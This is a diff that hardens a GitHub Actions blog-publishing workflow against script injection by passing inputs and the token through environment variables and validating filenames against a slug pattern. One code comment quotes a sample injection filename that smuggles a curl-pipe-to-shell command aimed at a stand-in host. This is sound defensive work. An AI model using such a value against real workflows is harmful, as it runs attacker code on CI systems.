@@ -19,6 +19,15 @@ jobs:
     permissions:
       contents: write
       actions: write
+    # All dispatch inputs reach the shell as env vars (job-level env below),
+    # never as `${{ inputs.* }}` inside a script. `${{ }}` is pasted into the
+    # script text before bash parses it, so a filename like `x"; curl evil | sh; "`
+    # used to run as a command in several steps. Dispatch needs write
+    # access, so this is hardening rather than a privilege boundary.
+    # (Audit 2026-11-26; this repo is the retired v1 site.)
+    env:
+      POST_FILENAME: ${{ inputs.post_filename }}
+      UPDATE_DATE: ${{ inputs.update_date }}
 
     steps:
       - name: Checkout
@@ -28,7 +37,13 @@ jobs:
 
       - name: Publish Draft Post
         run: |
-          POST_FILE="src/content/blog/${{ inputs.post_filename }}.md"
+          # The filename becomes a path and a sed target, so allow only a
+          # lowercase slug (blocks `../` and shell metacharacters).
+          if ! [[ "$POST_FILENAME" =~ ^[a-z0-9][a-z0-9-]*$ ]]; then
+            echo "::error::post_filename must be lowercase letters, digits and hyphens."
+            exit 1
+          fi
+          POST_FILE="src/content/blog/${POST_FILENAME}.md"
 
           if [ ! -f "$POST_FILE" ]; then
             echo "Error: Post file $POST_FILE not found!"
@@ -45,7 +60,7 @@ jobs:
           sed -i '/^draft: true$/d' "$POST_FILE"
 
           # Update publish date if requested
-          if [ "${{ inputs.update_date }}" == "true" ]; then
+          if [ "$UPDATE_DATE" == "true" ]; then
             TODAY=$(date +%Y-%m-%d)
             if grep -q "^publishDate:" "$POST_FILE"; then
               sed -i "s/^publishDate:.*/publishDate: $TODAY/" "$POST_FILE"
@@ -63,43 +78,47 @@ jobs:
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add src/content/blog/${{ inputs.post_filename }}.md
+          git add "src/content/blog/${POST_FILENAME}.md"
 
           # Only commit if there are changes
           if git diff --staged --quiet; then
             echo "No changes to commit - post may already be published"
             echo "skip_deploy=true" >> $GITHUB_ENV
           else
-            git commit -m "Publish blog post: ${{ inputs.post_filename }}"
+            git commit -m "Publish blog post: ${POST_FILENAME}"
             git push
             echo "skip_deploy=false" >> $GITHUB_ENV
           fi
 
       - name: Trigger Deployment
         if: env.skip_deploy != 'true'
+        # Token via env rather than pasted into the script text, so it never
+        # appears in the rendered command.
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           curl -L \
             -X POST \
             -H "Accept: application/vnd.github+json" \
-            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Authorization: Bearer ${GH_TOKEN}" \
             -H "X-GitHub-Api-Version: 2022-11-28" \
-            https://api.github.com/repos/${{ github.repository }}/actions/workflows/deploy.yml/dispatches \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/workflows/deploy.yml/dispatches" \
             -d '{"ref":"master"}'
 
       - name: Summary
         run: |
-          if [ "${{ env.skip_deploy }}" == "true" ]; then
+          if [ "${skip_deploy:-}" == "true" ]; then
             echo "ℹ️ No changes were made to the blog post." >> $GITHUB_STEP_SUMMARY
             echo "" >> $GITHUB_STEP_SUMMARY
-            echo "**Post:** ${{ inputs.post_filename }}.md" >> $GITHUB_STEP_SUMMARY
+            echo "**Post:** ${POST_FILENAME}.md" >> $GITHUB_STEP_SUMMARY
             echo "**Status:** Already published or no changes needed" >> $GITHUB_STEP_SUMMARY
             echo "" >> $GITHUB_STEP_SUMMARY
             echo "💡 Tip: This post may already be published. Check the blog to verify." >> $GITHUB_STEP_SUMMARY
           else
             echo "✅ Blog post published successfully!" >> $GITHUB_STEP_SUMMARY
             echo "" >> $GITHUB_STEP_SUMMARY
-            echo "**Post:** ${{ inputs.post_filename }}.md" >> $GITHUB_STEP_SUMMARY
-            echo "**Date Updated:** ${{ inputs.update_date }}" >> $GITHUB_STEP_SUMMARY
+            echo "**Post:** ${POST_FILENAME}.md" >> $GITHUB_STEP_SUMMARY
+            echo "**Date Updated:** ${UPDATE_DATE}" >> $GITHUB_STEP_SUMMARY
             echo "" >> $GITHUB_STEP_SUMMARY
             echo "🚀 Deployment to GitHub Pages has been triggered." >> $GITHUB_STEP_SUMMARY
             echo "" >> $GITHUB_STEP_SUMMARY
